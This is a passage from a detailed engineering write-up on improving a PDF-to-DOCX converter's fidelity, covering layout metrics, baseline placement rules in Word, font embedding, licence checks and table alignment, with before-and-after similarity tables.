the first kind mid-line: "em-ployed", "likeli-hood", "appro-priate",
"assess-ment". The soft ones are removed and the real ones left. This is why
pdf2docx's own `delete_end_line_hyphen` is not switched on: it works on the
character, not the intent, and would turn "non-critical" into "noncritical".
And the space after a list marker, which pdf2docx loses when it writes two PDF
spans as two runs, is put back from the gaps the PDF records, so a numbered
step reads "1. {{REMEDIATION STEP}}" again.

Alignment last. A paragraph whose lines all reach the column's right edge
except the last one is justified, which pdf2docx gets right on some paragraphs
and not others in the same document. The edge is taken from the run of lines
itself and then checked against the page's, because justified prose overshoots
the layout column by a glyph's overhang, by up to 5 pt here, while a table
stops exactly on it.

#### What it did to the numbers

Per page, before and after this round, on the owner's report:

| page | before | after | | page | before | after |
|---|---|---|---|---|---|---|
| 1 | 0.8962 | 0.8962 | | 13 | 0.9952 | **0.9954** |
| 2 | 0.9611 | 0.9608 | | 14 | 0.9687 | **0.9704** |
| 3 | 0.9647 | 0.9648 | | 15 | 0.9865 | **0.9892** |
| 4 | 0.9756 | **0.9759** | | 16 | 0.9827 | **0.9837** |
| 5 | 0.9740 | 0.9742 | | 17 | 0.9869 | **0.9896** |
| 6 | 0.9894 | 0.9895 | | 18 | 0.9828 | **0.9839** |
| 7 | 0.9907 | 0.9910 | | 19 | 0.9869 | **0.9896** |
| 8 | 0.9934 | 0.9936 | | 20 | 0.9832 | **0.9843** |
| 9 | 0.9693 | 0.9694 | | 21 | 0.9868 | **0.9896** |
| 10 | 0.9839 | 0.9838 | | 22 | 0.9570 | 0.9571 |
| 11 | 0.9798 | 0.9799 | | 23 | 0.9813 | 0.9815 |
| 12 | 0.9851 | 0.9852 | | | | |

Median 0.9828 to **0.9838**, mean 0.9766 to **0.9773**, worst unchanged at
0.8962 (the cover). Every finding page is up, which is the code panels. No
page is worse by more than 0.0003, which is rendering noise. Still 23 pages
against 23, 27 table-of-contents entries rebuilt, 0 of 390 lines missing, no
fallback.

#### What is still imperfect after this round

- **The cover, still 0.8962.** Looking at pdf2docx's shape handling for the
  panels did explain it: it renders a full-page image as a picture sized to
  the page box rather than to the image's own placement, so a full-bleed cover
  comes out about a tenth larger. That is inside its image placement, not its
  shape handling, and it is not a setting.
- **The figure placeholder's border still looks heavier** than the PDF's. It
  falls out of pdf2docx's own table borders rather than the shapes this round
  touched.
- **The table-of-contents dot leaders are tighter** than the PDF's spaced
  dots, because Word draws them from the tab stop at its own pitch. Cosmetic,
  and not worth a custom leader.
- **A panel whose text the converter split across a table boundary is not
  shaded**, because the match is per paragraph and a paragraph that already
  has a fill is left alone. On this report every code block is matched.
- **The justification rule needs three lines.** Two lines that both reach the
  edge is also what a centred pair looks like, so a two-line justified
  paragraph stays as the converter left it.

### Fidelity: measuring the gap, and closing the parts that could be closed

The owner called the export good and asked how close it could get. The first
thing that needed fixing was the ruler.

#### A metric worth steering by

The old score was one minus the mean absolute difference over a page rendered
200 px wide. A reviewer had already shown it cannot see a missing header: a
band of white where text should be is a small fraction of a page's pixels.
`compare_pages.py` now renders at 100 dpi and reports three things per page:
that score, a structural similarity over 8 pixel windows, and how far the
page's ink has moved and grown, in points, between the two ink bounding
boxes. The last one is what catches a picture placed at the wrong scale,
which looks nearly right until the boxes are measured.

It also writes an **overlay** per page into the contact sheets: the PDF's ink
in red, the Word render's in blue, ink they share in near black. On a page
that matches, the overlay is black text on white. That, and not any number,
is what says whether the job is done.

Where the reference report stood when the round began, under the new metric:
structural similarity **worst 0.7007 (the cover), median 0.8766, mean
0.8509**, one page whose ink had moved more than 2 pt.

#### The cover, which the overlay explained in one look

The PDF draws the cover image from y=-12 to y=804: it bleeds 12 pt off each
end of an 792 pt page. pdf2docx sizes the picture to the rectangle it was
drawn at, so Word lays all 816 pt of it from the top of the text area, and the
page comes out shifted down by the bleed with the bottom cut off. The
measurement said exactly that: dy +12.24, dh -12.24.

Every inline picture is now cropped to the part of it the PDF actually shows,
with `a:srcRect`, and sized to that. It stays inline, so nothing else on the
page moves, and the converter's own anchored renderings of vector art are left
alone because they have no counterpart in the PDF's image list.

| | before | after |
|---|---|---|
| cover, structural | 0.7007 | **0.9942** |
| cover, ink offset | 12.24 pt | **0.00 pt** |
| document mean | 0.8509 | 0.8637 |
| pages whose ink moved over 2 pt | 1 | **0** |

#### Line endings, which the owner asked for by name

Word breaks a justified line a word earlier or later than typst, and on a
text-heavy page that is most of what is left to see. The owner asked for the
PDF's layout, so `--line-breaks=pdf` is the default: a paragraph the converter
merged is split again with a manual break at each of the PDF's own line
endings and left justified, which Word honours for a line ending in a manual
break.

Two things had to be right, and the first attempt at each made pages worse,
which the metric caught:

- A break that lands only where a run boundary happens to fall is worse than
  none: the paragraph then carries some of the PDF's line ends and lets Word
  choose the rest. Pages 5, 9 and 22 fell by up to 0.23. Breaks now split a
  run at the exact character.
- A line that exactly fills the column in the PDF is a hair too wide at Word's
  metrics and wraps again into a short orphan, which pushes the rest of the
  page down. The paragraph is given back the overhang the PDF's own justified
  lines have over the nominal column (they reach up to 5 pt past it, measured)
  plus 4 pt. Page 5 recovered from 0.5723 to 0.7944.

Where it stands, both modes measured on the reference report:

| | `--line-breaks=word` | `--line-breaks=pdf` (default) |
|---|---|---|
| mean | 0.8637 | 0.8603 |
| page 5 | 0.7957 | 0.7944 |
| page 9 | 0.7793 | 0.7052 |
| page 22 | 0.7115 | 0.7124 |
| line endings | Word's | **the PDF's** |

So the honest summary is that `pdf` mode does what it says, and my pixel
metric slightly prefers `word`, because the slack a forced line needs widens
the ink by a few points on the right margin and page 9 keeps a difference I
did not chase down. The flag exists so the other answer is one word.

#### The fonts, which forced line endings make necessary

With the PDF's line endings reproduced, a substituted font is not only a
change of look: a line that fitted no longer does and the page re-wraps. So
the fonts travel with the file, whole rather than subsetted, as obfuscated
font parts with a relationship and a key per face.

Licences are read rather than assumed: the OS/2 `fsType` decides, and
installable, editable and preview-and-print are embedded while restricted and
bitmap-only are not. A font that may not travel is named in a warning saying
what a reader without it will see. The reference report embedded Poppins and
DejaVu Sans Mono, eight faces, and grew from 1.61 MB to **2.62 MB**. (It
carries ten faces now, three families: see part four, where it turns out that
none of this made Word use any of them.)

#### What was not done in that round, and why

- **Table and box borders** were still heavier than the PDF's.
- **The table-of-contents leader** was still Word's dot leader at Word's
  pitch rather than the PDF's spaced dots. Page 2 was the worst page in the
  document at 0.6377.
- **Code panel padding** and **vertical rhythm** were not attempted. The
  overlay showed the second one clearly: on text-heavy pages the two inks
  agreed at the top of the page and drifted apart towards the bottom.

All four are the subject of the round below.

### Fidelity, part two: Word's own layout rule, applied per page

The drift down a page is not one mistake. It is four small ones that all
point the same way, and the only way to correct them is to know where Word
will draw a line before it draws it. That turned out to be knowable.

#### The one measurement the rest of the round rests on

With `w:lineRule="exact"` and a line height of L, **Word puts the baseline
exactly 0.8 x L below the top of the line box**, whatever the font and
whatever the point size. Measured over 30 cases, six sizes from 8 to 18 pt by
five line heights each from 1.0 to 2.0 em, one per page so nothing above
could contribute: every one landed on 0.8 x L within 0.10 pt, which is the
1/600 inch Word rounds to when it writes a PDF. The same probes showed that
spacing before and after sum rather than collapse, that spacing before is
dropped at the top of a page, and that a table stands as tall as its rows
plus the border drawn under the last one and nothing else.

Those four facts are the whole layout model. None of them is about this
report, and with them every block's position can be worked out from the file
alone, which is what lets the shipped converter correct a page without
rendering anything.

#### What pdf2docx gets systematically wrong

Measured against the model on the reference report:

1. The exact line height it writes is its own guess at the font's line box,
   not the distance the PDF put between two lines. A paragraph typst set at a
   17.0 pt pitch came out at 19.6, so every line after it sat 2.6 pt lower.
2. Spacing before is measured from the previous row's ink, and Word measures
   from the previous line box, which is taller.
3. The same gap is written as spacing after above and spacing before below,
   and both apply.
4. A paragraph the converter left whole and Word wraps is one line in the
   file and three on the page, so anything placed under it lands two lines
   high.

`align_vertical_rhythm` walks each page's blocks and makes the spacing
between two of them whatever puts the second on the baseline the PDF has for
it. A block whose height the file does not state ends the walk for that page;
a page whose first block would move more than a line is not understood and
keeps it; a page that would end below its bottom margin is put back as it
was, so the page count cannot change.

A table is left where the converter put it, and only the gap over it moves.
That is a measured decision, not a concession: the converter reads a table's
top off the PDF's own grid lines and sizes its rows from them, so its rules
already land on the PDF's. Placing a card by the first baseline inside it put
that baseline right and moved every rule under it 1 pt wrong, and the finding
pages lost about 0.045 of structural similarity each. Placing it by the PDF's
own top edge instead was tried too and was a net loss: better on two pages,
worse on nine.

#### The four that were left, and one that was hiding

- **The contents page.** Word repeats a leader glyph at the font's advance for
  it and nothing else, so its dots were 3.1 pt apart where typst set them at
  4.8 and the list read as a rule. The difference is measured off the PDF's
  own glyph positions and added to the run that carries the tab as character
  spacing, which is the formatting Word draws the leader in. The titles were
  also a space too far right, all of them: the pass that puts back a space the
  converter ran together walks a paragraph's text nodes, a tab is not one of
  them, and so "2.1" and the title beside it looked adjacent.
- **The header rule** ran to the right margin, because Word draws a rule
  under a paragraph between that paragraph's indents. It now takes the ends,
  weight and colour of the stroke found under the running header. That was
  the whole of the extra ink the page comparison had been measuring: 3.6 pt
  on fifteen pages, now 0.0 on eleven of them.
- **The code panel's accent bar** was drawn against the first character of
  each line rather than down the panel's edge. A paragraph border takes a
  stand-off, and the distance from the bar to the code is in the PDF.
- **Borders**, in the end, needed one character. A table is its rows plus the
  border under the last one, and the vertical pass was throwing that width
  away because the converter writes the attribute as `w:sz="12.0"`, which the
  schema does not allow and Word reads anyway. Every page whose first block
  was a bordered heading table placed everything under it 1.5 pt low, which on
  this report is most of them. Fixing the parse moved the mean more than
  anything else in the round.
- **Hyphens**, which nobody had asked for. A word broken across two lines
  carries a soft hyphen, which is removed because Word would print it in the
  middle of a line, and where the Word file still breaks the line in the same
  place that left the page reading "em ployed". The pairs of words the PDF
  broke are collected from its rows and a real hyphen goes back at those line
  ends only.

#### Numbers

Structural similarity against the PDF, same metric, same defaults
(`--line-breaks=pdf`):

| | before | after |
|---|---|---|
| worst page | 0.6377 (contents) | **0.7760** (introduction) |
| median | 0.8783 | **0.8998** |
| mean | 0.8603 | **0.8881** |
| contents page | 0.6377 | **0.8688** |
| pages whose ink moved over 2 pt | 0 | **0** |
| extra ink per page, typical | 3.6 pt | **0.0 pt** |

Every page of the report improved except page 11, which lost 0.007 to a block
the converter writes as one paragraph where the PDF has a sub-heading and the
body under it at two different line pitches. One line height cannot be both,
and the block is placed to straddle them.

### Fidelity, part three: the lookup, the row, and a budget

A safety review of the two rounds above found the passes correct and
unbudgeted, and four more things came out of looking at the overlay again.

#### The fidelity passes now have a budget

Breaking each paragraph where the PDF broke it and putting every block on its
own baseline both grow with the document, and a correct conversion that runs
past the server's child timeout dies with a generic message. What they will
cost is now estimated from what the document has already cost: the repairs
that must run whatever happens walk the same paragraphs, so their measured
time is the size of the document in the only unit that matters, and the
reservation is a multiple of it. Past that margin the two are skipped and the
export says so. **The text check and the link check are never part of that
decision.**

Two shapes were profiled first, looking for something quadratic. There was
nothing: a 25-page table of 1,249 rows spends 376 s of its 387 inside
pdf2docx and 0.4 s in these passes, and a 23-page prose document spends 3.8 s
of 5.7 there and 0.1 s here. The bound is a bound, not a fix for a hot spot.

#### A font is read before it is carried

fontTools decompiles a table only when something asks for one, so a font
truncated to a third of itself answers every question the embedder puts to it
and fails only when a glyph is drawn, on the reader's machine. The tables a
usable font needs are now required by name and one real outline is decompiled
before the file is accepted. The bytes are bounded as well, 15 MB for a face
and 40 MB for the file, because the 100 MB output ceiling is only checked
after the file is built.

#### Eleven lines that were never broken at all

Twelve of the reference report's lines were not where the PDF puts them, and
the reason was not that they were too wide for Word. The pass that breaks a
paragraph at the PDF's line ends looked for a paragraph whose **whole** text
was the run's lines joined, and the converter writes a sub-heading and the
paragraph under it as one block. The run then holds only the body, the lookup
found nothing, and Word wrapped those lines wherever it liked.

The run may now be the end of a paragraph rather than the whole of it. Not
the middle: a table of contents entry contains its own title twice over once
the leader is squashed away. And not any paragraph holding a row of dots,
because the comparison deletes those and the text does not, so a character
offset counted in one is not the same place in the other. That put a line
break inside a leader, and the text check caught it.

#### The heading that opens a section

It came out 1.25 pt below the PDF's on every page that has one, and two
earlier attempts had cured that by moving the table and its rule with it.
Measuring the rule settled it: the rule is already right within 0.15 pt and
only the text inside the row sits low. So the row keeps its height and the
cell's line box is resized instead, since Word draws a baseline at 0.8 of it.
Nothing moves but the text, so no rule moves and no page can grow.

| | before | after |
|---|---|---|
| worst page | 0.7760 | **0.7774** |
| median | 0.8998 | **0.9033** |
| mean | 0.8881 | **0.8892** |
| contents page | 0.8688 | **0.8705** |
| lines Word wrapped again | 12 | **1** |

The one line left is a word inside a diagram that was never a forced line.

#### Three things tried and taken out

- **Splitting a block that holds two line pitches** into a paragraph each. It
  works: the block's own lines went from 2.3 pt out to 0.05. But the pass
  keeps a table where the converter put it by remembering where the converter
  would have put it, and splitting a block invalidates that reference, so the
  tables under it moved 12 pt. Page 10 gained 0.022 and page 11 lost 0.25.
- **A code panel as a one-cell table**, which is the only way a DOCX can put
  padding between a grey box and the text in it. The cell carries the
  shading, the accent bar and the margins, and the code goes inside unchanged.
  Placing that table needs the left edge of whatever contains it in the PDF's
  coordinates, and on a finding page the container is itself a table cell
  whose x the converter does not record, so the code lost its indent. Eight
  pages lost about 0.035 each.
- **Matching a table row cell by cell** rather than as one string, to reach
  the rows of a data table. No page gained and one lost 0.002.

### Fidelity, part four: the fonts that Word really uses

I exported the owner's report through the running app, rendered the Word file
back to PDF through Word, and ran `pdffonts` on the render. Word had used
`Poppins-Regular`, `Poppins-Bold`, `Poppins-Italic`, `Poppins-BoldItalic`,
`Poppins-SemiBold`, `Verdana`, `Cambria` and `TimesNewRomanPS-BoldMT`. Eight
`odttf` parts were in the file, Word reported `EmbedTrueTypeFonts = True`, and
DejaVu Sans Mono was not in the render at all: the code blocks were set in
Verdana, a substitute, with the real face sitting unused in the same document.

Afterwards the same render lists `Poppins-Regular`, `Poppins-Bold`,
`Poppins-Italic`, `Poppins-BoldItalic`, `Poppins-SemiBold` and
`___WRD_EMBED_SUB_46` twice, and nothing else. That last name is Word's own,
which is the point: Word renames a font it loaded from a document rather than
off the machine, and the face behind it, read out of Word's render by its
PostScript name, is `DejaVuSansMono`. The code lines went from 10 to 40 per
cent wider than the PDF's to inside 0.05 pt of them: `curl` 21.67 pt in the
PDF, 16.72 in Verdana, 21.62 now.

The cause is one sentence. **Word looks a font up by the legacy family name
in the font file's own name table, name ID 1, plus the bold and italic bits
the file states in name ID 2, and by nothing else.** The converter was writing
the name the PDF uses, which is the PostScript name. Before:

```xml
<w:rFonts w:ascii="DejaVu Sans Mono" .../>     <!-- the run asks for this -->
<w:font w:name="DejaVuSansMono">               <!-- the file declares that -->
```

Two names, one font, no match. After, both say `DejaVu Sans Mono`, and every
name written into the document now comes out of the staged font file.

Poppins SemiBold is the second half of it and was hiding behind an installed
font. Word keeps four faces per family, so a weight outside those four is a
family of its own: the file's name ID 1 is `Poppins SemiBold` and its name ID
2 is `Regular`. The converter was writing `Poppins SemiBold` with `w:b` set,
which asks Word for a face that does not exist and gets a fake weight painted
over one that does, and the table declared no such family at all, so on a
machine without it the heading would have fallen back to `Poppins` plus that
fake weight. Now the family is declared, carried, and asked for with the bold
bit cleared. That costs a little on my own screen, because the synthetic bold
was 0.3 pt closer to typst's tracking than the real semibold is, and pages 3,
5, 7, 8, 10, 11, 13 and 22 each lost 0.001 to 0.003 of similarity. The finding
pages, which is where the code lives, gained: 15, 17, 19 and 21 by 0.0057 to
0.0058 each, 16, 18 and 20 by about 0.0022, page 14 by 0.0008. Mean similarity
0.8892 to 0.8900, 23 pages, 390 of 390 lines, 27 contents entries, code text
byte-identical and 99 forced line breaks before and after.

#### Three things I had to read rather than assume

- **Name ID 2 is words, not a substring.** `"bold" in "semibold"` is true in
  every language I know, and it is wrong here. The OpenType spec limits that
  record to Regular, Bold, Italic and Bold Italic, with Book and Oblique in
  the wild, so it is split on whitespace and punctuation and read as words.
  DejaVu Sans Mono's regular face calls itself `Book`.
- **PyMuPDF hands a font name back out of a 24 byte field.**
  `DejaVuSansMono-BoldOblique` is 26 characters and arrives two short of
  itself. So a PDF font name that begins exactly one staged face is taken to
  be that face, and one that begins two stays unmatched. I found this because
  the probe's `BtctProbeSansSemiBold-Regular` came back as
  `BtctProbeSansSemiBold-Re`.
- **pdf2docx names a span by containment over those cut-short names.** Its
  `Fonts.get` tries an exact match, then whether either name contains the
  other, so a semibold face whose name was cut short comes back as the family
  below it and the run is labelled `Btct Probe Sans` with the bold bit on. It
  is told what the face is instead. Only the name is replaced: the line height
  it measured for the face it picked is left exactly as it was, so nothing on
  the page moves, and on the owner's report the override changes nothing at
  all because its names are short enough to match exactly.

#### The stray fonts, and where they were

Cambria was 682 spaces and Times New Roman Bold was four black squares.

The squares are a chart legend's swatches. pdf2docx drops the drawing, so the
converter puts them back as a filled-square character in the label's own run,
and Poppins has no glyph for that character, so Word chose a font. It now
picks a face the file carries that has the glyph, at the neighbour's size so
the line it joins is no taller.

The 682 spaces are tabs and paragraph marks. pdf2docx writes a tab as a run
with no properties at all and gives no paragraph its own mark properties, so
both fall to the document default, which on a file built from python-docx's
template is 11 pt Cambria. Neither draws anything, but Word writes a paragraph
mark out as a space when it makes a PDF, so the finished file was set in a
font it did not carry and could not be shown to use only the fonts it did.
Each now takes the font and size of the text beside it.

The one of those that could have moved something is the mark of a paragraph
with no text, because an empty paragraph's height is its mark's. I measured it
before I wrote it: 22 of them on the reference report, every page scoring to
four decimal places exactly as it had, same page count. `pdffonts` on the
render now lists no font that did not come out of the file.

#### The probe, and the one thing it found that I was not looking for

None of the above could be proved on this machine, because it has Poppins
installed: a file that named its fonts wrongly still looked right. So I made
fonts instead. `font_probe.py` copies permissively licensed faces out of
`public/fonts/` and rewrites their name tables to families nobody can have
installed: `Btct Probe Sans` with all four of Word's faces, `Btct Probe Sans
SemiBold` as a family of its own, `Btct Probe Mono`, and `Btct Probe Serif` as
a control. It sets a one-page report in them, compiles with
`--ignore-system-fonts`, converts, renders through Word and reads `pdffonts`.
DejaVu Sans Mono is Bitstream Vera plus public-domain changes, whose licence
allows modification and forbids `Bitstream` or `Vera` in the new name;
Libertinus Serif, the control, is OFL 1.1, which allows modification and
requires the name to change. Both keep their copyright and licence records.

The first run came back `Cambria, Calibri, Calibri-Bold, Calibri-Italic,
Calibri-BoldItalic, ___WRD_EMBED_SUB_46`. The monospace family, a `.ttf`, came
out of the file. The other family, a `.otf`, did not: **Word carries TrueType
outlines and nothing else.** `w:embedTrueTypeFonts` means what it says, and a
font with PostScript outlines can be written into the package, declared in the
table with a key and a relationship, and ignored. Six of the seventeen default
report fonts are in that position, including Libertinus Serif and New Computer
Modern, so a report set in one of them was shipping a megabyte of bytes Word
would never read while the file claimed to carry the font. It is refused with
a reason now.

With the probe rebuilt on TrueType faces, both renders of the same file list
`___WRD_EMBED_SUB_53` (the semibold family, with no `,Bold` suffix, so no
painted-on weight), `___WRD_EMBED_SUB_48` and its `,Bold`, `,Italic` and
`,BoldItalic`, `___WRD_EMBED_SUB_46`, and Cambria for the control's one line.
Reading each back by its PostScript name gives the six probe faces. Every
visible glyph but the control's is in a face that came out of the file, twice
over, on a machine where not one of those families is installed.

What the probe does not prove: that Word on macOS or on an older Windows build
behaves the same way, that a reader who opens the file in LibreOffice or
Google Docs sees any of it, or that the control substituting to Calibri here
means it substitutes to Calibri anywhere. It proves that this Word, given this
file, drew the report in fonts it could only have read out of the file.

### Fidelity, part five: the fonts Word will not carry at all

Part four ended with a finding I did not go looking for: Word embeds TrueType
outlines and nothing else, so an `.otf` face is written into the package,
declared in the table with a key and a relationship, and ignored. I refused
those with a warning and moved on. That was the wrong place to stop, because
six of the seventeen fonts the compiler ships are in that position and one of
them is typst's default, which is what BTCT's own starter template asks for.
So a report nobody had customised exported to a Word file set entirely in
Cambria.

Now they are redrawn. Each cubic curve is approximated by a quadratic within
a thousandth of an em, using fontTools' `Cu2QuPen` into a `TTGlyphPen`, which
is the approach the well-known `otf2ttf` script takes; fontTools 4.65 has the
pens but no ready-made converter, so the table bookkeeping is here: build
`glyf` and `loca`, drop `CFF `, `VORG` and `DSIG`, `maxp` to version 1.0,
`post` to format 2 with the glyph names kept, `head.glyphDataFormat` to 0,
`sfntVersion` to `\x00\x01\x00\x00`.

The measurement that matters is that nothing moved. Over all thirteen
OpenType faces in `public/fonts`, every advance width is the number it was,
every vertical metric in `hhea`, `OS/2` and `head` is unchanged, and `GPOS`,
`GSUB` and `MATH` came across untouched. Only the side bearings move, and
only to the redrawn outline's own left edge, which is where the format says
they belong. The forced line endings rest on those widths, so that is the
property the test asserts rather than anything about the curves.

It costs 1.0 to 4.9 seconds a face and grows the bytes: Libertinus Serif
Regular 329 KB to 616 KB, New Computer Modern 10 Regular 573 KB to 803 KB,
the Math face 1124 KB to 1520 KB. A family is four of those, so it is the one
optional step here that can be worth ten seconds, and it is given what is
left of the export's deadline after a margin for writing the file. A face
there is no time for is refused with a warning rather than started.

A later round also strips every character XML 1.0 forbids from a family's
name as soon as it is read (`fonts.read_font`), because a hostile font can put
one in its name table and an unfiltered name would leave `word/fontTable.xml`
unparsable; stripped to nothing, the font is treated as unreadable like any
other bad one. The redraw budget above is now checked every 200 glyphs inside
a face's own conversion loop rather than only before a face starts, since one
CFF face of tens of thousands of glyphs (1,200 to 2,200 glyphs a second,
measured here) could otherwise run well past the allowance on its own; the
byte cap is likewise read off the file on disk before a face is converted, so
a refusal is not paid for by the conversion it refuses. A face whose redraw
raises, or an `embed()` call that raises outright, now degrades to a plain
warning rather than losing a Word file that has already passed the text check
and the link check.

On the starter template: Word's render went from `Cambria`, `Cambria-Bold`
and `Cambria-Italic` to `___WRD_EMBED_SUB_46` and `___WRD_EMBED_SUB_46,Bold`,
which read back as `NewCM10-Regular` and `NewCM10-Bold`. Similarity 0.9483 to
0.9585, mean absolute difference 0.9925 to 0.9950, and the ink box's height
error fell from 3.6 pt to 2.88 pt. The bold spans now land within 0.1 pt of
the PDF: `2.1 Example Finding` 136.90 pt in the PDF against 122.15 in Cambria
and 136.82 now; `CVSS` 32.76 against 24.63 and 32.82.

#### Redrawing a font is a modification, so the licence is read too

`fsType` says whether a font may be embedded. It does not say whether it may
be altered, and redrawing outlines is altering. So the licence name records
are read as well, IDs 13 and 14 and, because New Computer Modern states its
terms there and has no 13 at all, ID 0. A face is redrawn only under a
licence recognised here: the SIL Open Font License, Apache 2.0, Bitstream
Vera, the GUST Font License, the Ubuntu Font Licence. Anything else is
refused with `its outlines are a kind Word cannot embed, and its licence does
not clearly allow converting them`, which is a refusal to guess rather than a
finding about the font.

The OFL question, plainly, because two of its clauses pull against each
other. Clause 3 says no Modified Version may use a Reserved Font Name, and
the embedded copy deliberately keeps its family name, because that name is
the only thing Word matches on. Clause 2 allows modified copies to be
redistributed under the same terms. The reading this takes is that a font
embedded in a document is not font software being distributed to anyone as a
font: it is one document, the copy cannot be installed, and every word
processor and PDF writer subsets and re-formats fonts to embed them. That is
the common industry reading and I believe it is the right one, but I have not
read the OFL FAQ's wording on it on this machine and I am not a lawyer, so it
is a judgement call and it is recorded here as one. Anyone who disagrees has
`--no-font-conversion`, which puts the old behaviour back.

#### The preview-and-print bit, which cost me an afternoon

The starter template's first converted build would not render through Word at
all: `Repaginate` answered `the Repaginate method or property is not
available because a macro is currently running` and `SaveAs2` answered `this
command is not available`. I assumed my converted font was malformed. It was
not. New Computer Modern's italic and bold-italic carry `fsType` 12, which
sets the preview-and-print bit, and Word honours that bit by opening the
entire document read-only. Embedding one takes away the thing this export
exists to hand somebody, so it is now refused per face with its own reason,
and a family whose italic is restricted is carried in the faces that are not.

The four levels are now: installable and editable are carried, restricted and
preview-and-print are not.

#### And a rule from part four that was half right

Name ID 2 says which of Word's four slots a face fills. Part four read it as
words so that `SemiBold` would not be taken for `Bold`. New Computer Modern
spells its bold italic `BoldItalic`, one word, which that rule read as
neither bold nor italic: it took the regular slot, and the real regular face
was never carried, so Word set the body text in the bold one. The rule now
reads the whole record instead of searching it: the slant is a suffix, and
what is in front of it is the weight, which is bold when it is the word
`bold` and nothing else. Ten spellings are pinned in `test_convert.py`,
including both of the ones that were bugs.

#### What the probe says now

The probe grew a fourth family whose outlines are PostScript, and its control
is the same document converted again with `--no-font-conversion`: one flag
apart, the same face. With conversion on, all seven probe faces come out of
the file, twice over, including `BtctProbeSerif-Regular`. With it off, that
one family substitutes to Cambria and the other three still come out of the
file. No probe family can be installed anywhere, so Word can only have read
them from the document.

#### What a DOCX cannot express

Some of the remaining difference is not a bug to be fixed.

- **Glyph positioning.** Word hints and rounds glyph positions to its own
  grid and applies its own kerning pairs; typst positions glyphs at
  fractional coordinates. Two renderings of the same text in the same font at
  the same size do not land on the same pixels, which is the faint red and
  blue fringing on every overlay and the reason no page will reach 1.0.
- **Justification.** Word distributes slack between words by its own rule.
  Even with the same line endings, the word positions within a justified line
  differ from typst's by a fraction of a space.
- **Transparency and blend groups.** A PDF can composite with a group alpha
  that Word has no way to describe; the converter flattens what it can see
  and drops what it cannot.
- **A running band is one definition per section.** Word repeats one header
  for a whole section, so a band that differs per page can only be
  approximated, which is why the converter declines an alternating one rather
  than inventing something.
- **Padding between a shaded paragraph and its grey.** Word fills a shaded
  paragraph between its indents and over its line boxes only, never over its
  spacing: measured on five cases, the grey box round a paragraph with 9 pt of
  space before and after is the same box. A paragraph therefore cannot carry a
  panel's padding, which is why a code panel is a table now (part six).
- **One line height per paragraph.** Where the converter writes a sub-heading
  and the paragraph under it as a single block, the PDF has two different line
  pitches inside it and Word can only be given one. Splitting the block cures
  that and costs more elsewhere; see above.
- **Justification.** On a page of justified prose the line ends now agree
  exactly and the words inside a line do not: Word distributes the slack by
  its own rule. That is most of what is left on the prose pages and there is
  no knob for it.

### Fidelity, part six: inside a table

Three commits. `test_convert.py` 141 to **206 checks, 0 FAIL**. Vitest
unchanged at 56 files / 592 tests. Same metric, same defaults
(`--line-breaks=pdf`), same machine, same Word.

**Worst page 0.7753 to 0.8063. Median 0.9021 to 0.9101. Mean 0.8900 to
0.9103.** Lines more than a point off their PDF baseline: **80 to 30**. Still
23 pages, 390 of 390 lines, no fallback, 27 table-of-contents entries, fonts
embedded.

Everything the vertical pass does stopped at a table. It puts every top-level
block on the baseline the PDF has for it, and then a table came along and it
placed the box without looking inside. So the rows of a data table sat 2.3 pt
low, and a finding card's text 4.4 pt low by the middle of the card.

#### Why the rows could not be paired before, and what pairs them now

The PDF reads a table row across its columns. The converter writes it down
one column and then the next. Join both to a string and they never agree, so
two earlier rounds tried matching a row's text and gave up, and the one case
that did work was a heading table, which has a single line in a single cell.

The pairing is geometry, not order. A table's row heights and cell widths are
already the PDF's own rules, because pdf2docx reads them off the page, so
anchoring that grid at the table's top left corner puts every cell back where
the PDF drew it, and a text line belongs to the cell whose rectangle holds its
centre. I checked that before writing the pass: 341 cells over 23 pages, 324
of them collecting exactly the text the file has in them, and the 17 that did
not were cells holding a nested table, where the order inside does not matter
because the pass recurses into it.

One thing had to be unlearned on the way. A page's rows are split into
columns so that two cells of the same table row can be told apart, and inside
one cell those pieces are a single line again. Reading a list marker and the
text beside it as two lines put every numbered remediation step half a line
height too high, which cost four pages about 0.02 each before I caught it.

#### Word's cell layout rule, measured

With `w:lineRule="exact"` Word draws a baseline at 0.8 of the line height.
Inside a cell there are two more terms, and I had one of them wrong:

> The first baseline inside a cell sits at the row's top, plus the cell's own
> **top border**, plus the cell's top margin, plus the first paragraph's
> spacing before (which is **not** dropped the way it is at the top of a
> page), plus 0.8 times the exact line height.

The border term is the one that is not obvious. Measured over 151 cells of
the reference report's Word render: with it, 148 of them land within 0.2 pt
of where the model says and the median residual is 0.02 pt; without it the
median is 0.74, which is the rule the report draws across the top of a card.
With the whole model in place, 242 of 244 paragraphs in the finished file sit
within 0.3 pt of their predicted baseline.

Nothing changes height. Rows keep their exact heights, so no rule moves and
no page can grow, and a correction that would push a cell's last line past
the bottom Word clips an exact row at gives that whole table back.

#### The code panel is a table now

Word fills a shaded paragraph between its indents and over its line boxes
only, so the grey hugged the code where the PDF leaves 7 pt above it, 4.8
below and 9 to the left. A table can say that. The cell carries the fill, the
accent bar is a narrow cell of its own in the bar's colour, and the row is
exactly as tall as the PDF's rectangle. The panel now lands within 0.5 pt of
the PDF's rectangle on every side.

An earlier round built this shape and reverted it, because placing the table
needed the left edge of whatever contains it and inside a finding card that
container is a table cell whose x the converter does not record. It does not
need it. The panel is placed relative to the code it holds: the indent the
converter gave the code is spent on the table's indent, the bar's cell and
the text cell's left margin, and those three add up to the same number, so
the code does not move at all.

Three things about Word the shape had to be built around, each found by a
render that came out wrong:

- It **grows a row with an exact height by the cell's bottom margin**, which
  added 4.7 pt of panel the PDF does not have. So the top and bottom margins
  stay at nothing and the padding above and below the code is the spacing the
  vertical pass writes. A cell's fill covers its spacing, which is the whole
  reason a table works here and a paragraph does not.
- It **insets a cell's content by half a left border**, which put the code
  3.6 pt out when the bar was a border. Hence the bar as a cell.
- **Two tables that touch are one table**, so a paragraph goes either side.

#### And then the tables themselves could move

With the text inside a table no longer depending on where the table sits, the
table became safe to move, which it was not in the two rounds that tried it.
It was worth moving: the converter reaches a table through the spacing of
everything above it, so its rules came out 1.1 to 1.3 pt below the PDF's.

The correction is not read off one rule, which is what the earlier attempts
did and why they failed. It is the offset that lines up the most of the
table's own row boundaries with the edges the PDF drew across the same span:
the distance between the rules has to agree as well, and three boundaries
have to land before the fit is believed.

Two more things I measured rather than assumed. Only strokes count, never a
filled block's own edges: Word paints a cell's fill below the cell's top
border and the PDF paints it at the boundary, so matching a row boundary to a
colour band's edge moved four pages the wrong way by 0.6 pt. And the
correction is upwards only. Every error the converter's spacing makes points
the same way, which is why two inks that agree at the top of a page are 8 to
